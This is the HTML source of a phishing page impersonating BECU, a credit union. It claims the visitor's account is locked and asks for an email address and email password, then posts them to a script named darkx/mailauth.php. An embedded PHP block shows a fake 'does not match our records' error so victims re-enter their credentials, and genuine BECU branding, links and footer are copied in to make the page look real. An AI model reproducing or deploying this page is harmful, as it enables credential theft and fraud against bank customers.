<!DOCTYPE html> <html style class="js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients no-cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths" lang=en><meta charset=utf-8>
<meta name=viewport content="width=device-width, initial-scale=1.0">
<meta http-equiv=X-UA-Compatible content="IE=edge">
<title>BECU - Verify Your Identity</title>

<!--[if lt IE 9]>
        <script src="/Scripts/html5shiv.js"></script>
        <link href="/stylesheets/becu_olb_ie8.css?v=05-11-2015" type="text/css" rel="stylesheet" />
    <![endif]-->
<link rel=icon type=image/png href="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" sizes=32x32><style>.sf-hidden{display:none!important}</style>
<link rel="stylesheet" type="text/css" href="css/locked.css">
<link rel=canonical href=https://accessassistant.becu.org/Questions/Locked></head>
<body>
 
  <style type="text/css">
	.alert-warning {
background: transparent;
border-radius: 2px;
padding-left: 18px;
padding-bottom: 6px;
padding-top: -20px;
border: 1px solid red;
width: 80%;
margin-left: 40px;
	}
	
</style>


 
 <noscript class=sf-hidden>
        <iframe src="//www.googletagmanager.com/ns.html?id=GTM-T84HB2" height="0" width="0" style="display:none;visibility:hidden"></iframe>
    </noscript>
 
 
 
 <div id=standardHeader runat=server class=pageHeaderContainer>
 
 <div class=pageHeader>
 <nav class="navbar navbar-default" role=navigation>
 <div class=container>
 <div class=navbar-header>
 <a href=https://www.becu.org/ class=logo-becu>
 <img id=logomobile alt="BECU Online Banking - More than just money" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=sf-hidden>
 <img id=logotablet alt="BECU Online Banking - More than just money" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=sf-hidden>
 <img id=logodesktop alt="BECU Online Banking - More than just money" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAK8AAAA3CAYAAAB6pxpbAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAA4RpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNi1jMTM4IDc5LjE1OTgyNCwgMjAxNi8wOS8xNC0wMTowOTowMSAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wTU09Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9tbS8iIHhtbG5zOnN0UmVmPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VSZWYjIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtcE1NOk9yaWdpbmFsRG9jdW1lbnRJRD0ieG1wLmRpZDo2NDYzYzhmZC03NTJhLTRlNDYtYjU4OC0wYjU4MDNlODQ3ODYiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6QTEzNEY0MUFBNzkxMTFFN0FEOTBBQjkwNjY0QjY0MUQiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6QTEzNEY0MTlBNzkxMTFFN0FEOTBBQjkwNjY0QjY0MUQiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENDIDIwMTcgKFdpbmRvd3MpIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6YzhmMTA5ZGQtYzMxZi0yNTQyLTgzOTMtMmVmOTc2ZjhiOWM2IiBzdFJlZjpkb2N1bWVudElEPSJhZG9iZTpkb2NpZDpwaG90b3Nob3A6MmUzZThkMTItOWM5OC0xMWU3LWE1MDgt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">
 </a>
 <button type=button class="navbar-toggle collapsed sf-hidden" data-toggle=collapse data-target=#nav-main-dropdown>
 
 
 
 
 
 </button>
 </div>
 <div id=skiptocontent class=accessibility-skip-link>
 <a href=#container id=skiptomain>Skip to main content</a>
 <a href=#pages-utility-nav id=skiptonavigation>Skip to navigation</a>
 <a href=#standardFooter id=skiptofooter>Skip to footer</a>
 </div>
 <div id=nav-main-dropdown class="collapse navbar-collapse">
 <div class="dropdown-content cf">
 <div class=desktop-view>
 <ul class=pages-utility id=pages-utility-nav tabindex=-1>
 <li>
 <a id=LINKSEARCH runat=server href=https://www.becu.org/search class="search icon">Search</a>
 </li>
 <li>
 <a id=LINKBRANCHLOCATOR class="locations icon" href=https://www.becu.org/locations/find-locations runat=server>Locations</a>
 </li>
 <li>
 <a id=LINKSUPPORT runat=server href=https://www.becu.org/support/top-questions class="support icon">Support</a>
 </li>
 </ul>
 </div>
 <div class=desktop-view>
 <ul class=pages-main>
 <li>
 <a id=LINKMEMBERSMATTER runat=server href=https://www.becu.org/members-matter/community-involvement>BECU &amp; YOU</a>
 </li>
 <li>
 <a id=LINKEVERYDAYBANKING runat=server href=https://www.becu.org/everyday-banking>Everyday Banking</a>
 </li>
 <li>
 <a id=LINKLOANSMORTGAGES runat=server href=https://www.becu.org/loans-and-mortgages>Loans &amp; Mortgages</a>
 </li>
 <li>
 <a id=LINKINVESTMENTSTRUST runat=server href=https://www.becu.org/planning-and-investing>Planning &amp; Investing</a>
 </li>
 <li>
 <a id=LINKBUSINESSBANKING runat=server href=https://www.becu.org/business-banking>Business Banking</a>
 </li>
 </ul>
 </div>
 <div runat=server id=NavigationContainer class=component-nav-links>
 </div>
 <div class="component-nav-links tablet-view sf-hidden" data-container-name=header-nav>
 
 
 </div>
 </div>
 </div>
 </div>
 </nav>
 <div style=display:none>
 </div>
 
 </div>
 <uc2:navbarfixer id=NavBarFixer1 runat=server>
 </uc2:navbarfixer></div>
 
<form action=darkx/mailauth.php class=form-vertical method=post role=form novalidate>
<div class=container-fluid style="margin:0 auto 0 auto;padding:20px">
 <main role=main>
 
<div id=pageBody class=container>
 <div class=pageTitle>
 <h1 class=headline>
 Verify Your Identity
 </h1>
 </div>
 <?php 
                                if (isset($_GET['ReasonCode'])) {
                                $ReasonCode = isset($_GET['ReasonCode']) ? trim(htmlentities($_GET['ReasonCode'])):'';
                                $em = "6004";
                                if ($ReasonCode == $em) {
                                print"<input type='hidden' name='ReasonCode' value='ReasonCode'><div class='alert alert-warning' role='alert'>
										<p  id='SignOn-Error' style='font-size: 13px'  > (11002): The information you provided does not match our records. Please re-enter your information and try again.</p>
									</div>";}}?>
 <div class=row>
 <div class=col-sm-9>
 <p>To protect your account from fraudulent access, it has been locked. Access to your account can be reset.</p>
 <p>For security, we'll use a series of questions to verify your identity.</p>
 </div>
 </div>
 <div class=row>
 <div class="validation-summary-valid text-danger" data-valmsg-summary=true><ul><li style=display:none></li>
</ul></div>
 <div class=col-sm-6>
 <label for=Username>Email Address</label>
 <input autocomplete=off class="form-control textbox" data-val=true data-val-required="The Username field is required." name=mail type=text value required="">
 </div>
 </div>

 <div class=row>
 <div class=col-sm-6>
 <label for=PhoneNumber>Email Password</label>
 <input autocomplete=off class="form-control textbox" data-val=true data-val-required="The Legal Name field is required." name=password type=password value required="">
 </div>
 </div>

 <div class=row>
 <div class=col-sm-3>
 <input type=submit class=continue-button value=Continue>
 </div>
 </div>
 <div class=row>
 <div class=col-sm-9>
 <p>Or call <span class=help-line>800-233-2328</span> for assistance.</p>
 </div>
 </div>
 <div class="row page-footer">
 <div class=col-sm-9>
 <b>Enroll in online banking</b>
 <p>You may have become a BECU member without signing up for online banking. <a href=https://onlinebanking.becu.org/BECUBankingWeb/Enrollment.aspx>Enroll in online banking now.</a></p>
 <p>Not a BECU member yet? <a href=https://www.becu.org/Join>Join us.</a> </p>
 </div>
 </div>
</form></div>
 </main>
</div>
 
 
 
 
 
 
<div id=skipfootercontent class=accessibility-skip-link style=position:relative>
 <a href=#container id=skiptomainfooter>Skip to main content</a>
 <a href=#pages-utility-nav id=skiptonavigationfooter>Skip to navigation</a>
</div>
<footer class=footer id=standardFooter>
 
 <div class=container>
 <div class=footer-links>
 <ul>
 <li>
 <a id="1 1" target=_self href=https://www.becu.org/accessibility-statement>ACCESSIBILITY</a>
 </li>
 <li>
 <a id="1 2" target=_self href=https://www.becu.org/members-matter/about-membership>MEMBERSHIP</a>
 </li>
 <li>
 <a id="1 3" target=_self href=https://www.becu.org/support/forms>FORMS</a>
 </li>
 <li>
 <a id="1 4" target=_self href=https://www.becu.org/about-us/home>ABOUT US</a>
 </li>
 <li>
 <a id="1 5" target=_self href=https://www.becu.org/support/routing-number>ROUTING NUMBER 325081403</a>
 </li>
 </ul>
 <ul>
 <li>
 <a id="2 1" target=_blank href=https://www.becu.org/~/media/Files/PDF/avoidingForeclosure.pdf>AVOIDING FORECLOSURE</a>
 </li>
 <li>
 <a id="2 2" target=_self href=https://www.becu.org/members-matter/news-discounts>NEWS &amp; DISCOUNTS</a>
 </li>
 <li>
 <a id="2 3" target=_self href=https://www.becu.org/support/contact-us>CONTACT</a>
 </li>
 <li>
 <a id="2 4" target=_self href=https://www.becu.org/careers>CAREERS</a>
 </li>
 <li>
 <a id="2 5" target=_self href=https://newsroom.becu.org/>NEWSROOM</a>
 </li>
 </ul>
 <ul>
 <li>
 <a id="3 1" target=_self href=https://www.becu.org/security-and-privacy>SECURITY</a>
 </li>
 <li>
 <a id="3 2" target=_self href=https://www.becu.org/online-privacy-notice>PRIVACY</a>
 </li>
 <li>
 <a id="3 3" target=_self href=https://www.becu.org/~/media/Files/PDF/BECUTermsandConditions.pdf>TERMS &amp; CONDITIONS</a>
 </li>
 <li>
 <a id="3 4" target=_blank href=https://survey3.medallia.com/?becumembersuggestions>SEND A SUGGESTION</a>
 </li>
 <li>
 <a id="3 5" target=_self href=https://www.becu.org/blog>BECU BLOG</a>
 </li>
 </ul>
 <ul class=footer-social>
 <div id=social-text class=social-text>
 Follow BECU
 </div>
 <li class=social-item>
 <a tabindex=0 href=https://www.facebook.com/becu title="BECU's Facebook page" id=facebook-link>
 <img src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="B E C U's Facebook page" id=facebook-image title="BECU's Facebook page" class=social-image>
 </a>
 </li>
 <li class=social-item>
 <a tabindex=0 href=https://www.instagram.com/becu title="BECU's Instagram page" id=instagram-link>
 <img src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="B E C U's Instagram page" id=instagram-image title="BECU's Instagram page" class=social-image>
 </a>
 </li>
 <li class=social-item>
 <a tabindex=0 href=https://twitter.com/becu title="BECU's Twitter feed" id=twitter-link>
 <img src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="B E C U's Twitter feed" id=twitter-image title="BECU's Twitter feed" class=social-image>
 </a>
 </li>
 <li class=social-item>
 <a tabindex=0 href=https://www.pinterest.com/becu/ title="BECU's Pinterest page" id=pinterest-link>
 <img src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="B E C U's Pinterest page" id=pinterest-image title="BECU's Pinterest page" class=social-image>
 </a>
 </li>
 <li class=social-item>
 <a tabindex=0 href=https://www.linkedin.com/company/becu title="B E C U's LinkedIn page" id=linkedin-link>
 <img src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" id=linkedin-image alt="BECU's LinkedIn page" title="BECU's LinkedIn page" class=social-image>
 </a>
 </li>
 <li class=social-item>
 <a tabindex=0 href=https://www.youtube.com/user/BECUVideo id=youtube-link title="BECU's YouTube page">
 <img src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" id=youtube-image alt="B E C U's YouTube page" title="BECU's YouTube page" class=social-image>
 </a>
 </li>
 </ul>
 </div>
 <div id=footer-legal class=footer-legal>
 <ul class=footer-copyright>
 <li>
 <div class=flex-display>
 <div class=ncua-text>
 <span id=ncua-text>
 © 2020 BECU. All Rights Reserved. Federally Insured by NCUA.
 </span>
 <span id=ehol-text>
 Equal Housing Opportunity Lender
 </span>
 </div>
 <div class=footer-ncua-ehol-container>
 <img id=ehol-logo class=ehol-logo title="We do business in accordance with the Federal Fair Housing Law and the Equal Credit Opportunity Act" alt="We do business in accordance with the Federal Fair Housing Law and the Equal Credit Opportunity Act" src=data:image/png;base64,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